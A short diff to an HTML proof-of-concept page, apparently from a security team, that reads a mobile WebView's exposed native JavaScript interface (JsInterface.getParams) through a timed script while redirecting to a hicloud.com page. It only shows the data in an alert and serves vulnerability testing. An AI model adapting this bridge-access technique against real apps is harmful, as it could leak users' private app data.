@@ -5,7 +5,12 @@
 <body>
 <table height=100% width=100%><tr><td>CBG Security Team</td></tr></table>
 <script>
-  alert(JsInterface.getParams())
+  setTimeout("getinfo()",10);
+  document.location.href="https://campaign-himovie.hicloud.com/";
+  function getinfo() {
+      alert(window.JsInterface.getParams());
+  }
+
 </script>
 </body>
 </html>
